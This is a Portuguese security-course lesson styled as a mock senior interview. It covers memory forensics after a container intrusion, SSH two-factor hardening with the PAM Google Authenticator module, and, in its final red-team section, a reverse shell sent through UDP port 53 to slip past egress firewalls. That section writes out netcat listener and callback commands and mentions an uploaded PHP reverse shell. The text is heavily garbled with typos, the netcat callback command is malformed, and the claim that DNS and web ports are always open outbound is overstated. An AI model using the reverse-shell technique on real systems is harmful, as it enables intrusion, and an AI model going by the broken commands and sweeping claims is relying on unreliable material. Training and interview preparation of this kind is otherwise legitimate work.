# Módulo 9: Projeto Final Senior
## Aula 03 - Simulação de Entrevista Técnica Senior (Red / Blue Team)

Aqui não medirei esforços para perguntar o Nível de Casos Reais Sêniors das "Big Techs" (Google / Mercado Livre). Abaixo, você lê a proposta de Inquisão técnica q recebrá em exames orais, as "Pegadinhas de quem decorou Vs de quem Sabe Realidade" e as "Respostas Check-List". Use e memorize!

### SESSÃO 1: BLUE TEAM & INCIDENT RESPONSE
**Entrevistador:** 
"Nosso painel CrowdStrike Alertou na madrugada q um WebServer do kubernetes NGINX container exposto abriu um bash. O Container Nginx tem SUID Root falso pra dropar caps depois pra Web. O Time SOC logou remoto e tirou o Cabo de REDE LOGICO do container correndo dps de 5 mins do Alert! Você é chamado. Ele quer Analisar. Ms dpois de 2 dias de análise das particoes root de Imagem HD (Dead disk forensync), os Blue Team Jrs falaram: "Não vi nada. O `/var/log` limpissimo. Os Processos Ps não mostran nada vivo. Tdo os files ok. Eu posso fechar ticket? Oq diabos o Hacker Fez se ele usou e tva Vivo mas dpos qm apagamos, nada de estrago de DB exfiltrou?"

**Sua Resposta MATADORA (Sênior):**
"NUNCA SE TIRA UM SERVIDOR OU CONTAINER DA TOMADA de suetão como 1º Ato de IR de SO LINUX, isso é Erro do SOC JR!! Quando puxaram as tomadas das interfaces e suspenderam o RAM / Desligraram o Container de Docker... Vocês DESTUÍRAM O MAIOR TESOURO FORENSE de Invasão de Kernel Level, q era A MEMÓRIA VIVA VOLÁTIL `/proc` E RAM HEAP DA MÁQUINA! O Atacante usou **FileLless Malware** Baseado só em RAM ou usou um Rootkit Dinamico de manipulação das chamadas Sys_Calls (LKM) q so vivia nos loops de hooks em memória, ocultando processos da listagem p `ps`. Uma vez q container reinicia/Morre, Nenhuma arqv executável foi escrita no Disco pro analista jr ler no dead-disk! Ele subornou o kernel e morreu ali. O correto seria TER DADO ISOLAMENTO COM SECURITY GROUP de Inbound na AWS, SEM MATAR a vCPU, tirado o DUMP Snapshot de Memória Vivo dele da nuvem cru `LiMe / Volatility` no ato e Analisarmos a Célula Viva do crime congelada!! Pra eu prender o cara o ticket eu leria os inodes sumidos com o volatility tools achando os PIDs q do fileless na ram dumpada."

### SESSÃO 2: ROAD MAP DE ARQUITETURA E DEVOPS (HARDENING)
**Entrevistador:** 
"A gerência achou q as senhas estavam vazando da AWS EC2, então o CEO ordenou q instalemos a Proteção Ultimate: Todo DB Server nosso agora não terá chave RSA SSH mais! SÓ TERÁ ACESSO MÁXIMO DE Root do S.O Se O CIDADÃO colocar o código Pessoal Digital do App "Google Authenticator 2FA 6-Digitos OTP (MFA)" junto com User/senha p entrar. Mas a porra do servidor é LINUX e linux é codigo console velho do ano de 80 C puro sem site html pra ler Qr-Codes! Tem como enfiar a Google autenticator de login OTP em Bash Console e obrigar a infra Linux a negar sem?"

**Sua Resposta MATADORA (Sênior DevOps):**
"Linux e a arquitetura Unix possuem o ecossistema PAM modular dinâmico. Foi Criado pr isoo! Existe uma lib opensource poderosa do PAM OATH-TOTP em pacotes Linux chama-se `libpam-google-authenticator`.
1) O admin roda o comando no usuário unix da pessoa, ele plota no prompt terminal de texto preto c branco em "Arte ASCII" o lindo QRCODE na tela.
2) O app celular scaneia da tela terminal do CMD msm e gera tokens validos.
3) Aí SÓ VAMOS NO CORAÇÃO DA AUTENTICAÇÃO `vim /etc/pam.d/sshd` e inserimos no TOPO A LINHA OBRIGATÓRIA q manda o modulo interceptar as chgdas: `auth required pam_google_authenticator.so`.
4) Nós editamos o `sshd_config` forçando a liberação `ChallengeResponseAuthentication yes`. Retartamos o SSH service. O SSH Client TCP agora perguntará não so a String de senha de input normal, msa droppara um "Verification code Time-based OTP:" string de tela obrigatorio! Blindando de hackers os brute forces infinitos ou password thefs de Keyloggers e trojans que as senhas vazadas terião!"

### SESSÃO 3: RED TEAM OFFENSIVE PATHWAYS
**Entrevistador:** 
"Durante Penetratin test de Red Team O NMAP achou Apache porta 80. Rodou Gobuster, achou "/upload/". Você achou a falha de bypass PHP uploaders the files e jogou o `shell_reversa.php` q bate lk pra teu Cali. Mas qnd o Linux Alvo tenta processar o "nc 10.x.x.x 4444" reverso pelo Php de lá O Servidor atira e "Timeout - Fail connect in target Port", pq O SysAmdin safado blindou o egress Firewall Outgoing do host impedidno portas malucas "4444 ou portas tcp custom" de SAIREEEEMMM de la com pacotes tcp Syn via UFW OUTPUT Drop policylies. 
Como q a gente bota RCE se Reverse socket morreu em chamas?"

**Sua Resposta MATADORA (O C-Level Red Team):**
"O erro é forçar caminhos mortos de script pradrão de meter porta "4444 ou 9001" bixas. Firewalls egress Drops são cruieis com anomalias de socket, MAS todo Host e WebServer em cloud de Produção *obrigatóriamente PRESCISA e TEM Q* comiunicar os deamons com 2 ou 3 caminhos santos universais p updates do OS p n ficarem quebrados em atualizacäes de package manager ubuntu ou repositorios da DNS. Portanto Pelo firewall IPTABLES das rotas de Egress as Portas TCP `80`, `443` HTTPS e Especialmente à Porta `53` DNS sempre estão flagadas ABERTAS (Permit/Allow) para pacotes q nascem de DENTRO pra internet Out ! 
O truque então eu Abro meu cali de Ncat usando porta Curinga Santificada do DNS UDP de falso servidor! `nc -lvup 53` e lá na maquina PHP eu do drop do `nc alvo 53 -u bash`. O Firewall verá q um cara no SO quer a port de DNS "nossinha ele quer ler sites inocente" e vai passsar via pacote de udp bypass livremente minha shell interativa na porta sagrada da internet de quebra cega de IPS egress!"
